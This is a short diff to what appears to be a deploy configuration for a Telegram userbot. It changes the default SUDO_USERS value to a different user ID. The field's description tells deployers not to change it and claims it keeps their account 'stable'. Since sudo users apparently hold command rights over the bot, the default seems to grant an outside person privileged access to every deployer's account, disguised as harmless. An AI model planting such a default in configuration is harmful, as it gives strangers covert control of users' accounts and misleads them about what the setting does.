@@ -79,7 +79,7 @@
   }, 
   "SUDO_USERS": {
    "description": "Don't change the value here. (Makes your acc and bot stable)",
-   "value": "719195224",
+   "value": "919057070",
    "required": false
   },
   "PRIVATE_GROUP_BOT_API_ID": {
